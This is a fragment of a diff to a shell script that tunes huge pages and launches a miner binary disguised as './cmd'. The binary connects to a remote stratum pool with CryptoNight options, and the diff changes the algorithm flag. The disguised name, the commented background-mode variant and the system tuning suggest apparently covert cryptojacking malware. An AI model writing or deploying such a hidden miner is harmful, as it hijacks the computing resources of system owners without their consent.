@@ -29,7 +29,7 @@ _RUN(){
      sleep 2
      sysctl -w vm.nr_hugepages=128
      sleep 2
-     ./cmd -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+     ./cmd -a cryptonight -o stratum+tcp://$END:$PORT -u $USER -p $TAG
      #./run -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
      #./run -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
      #_REBANNER
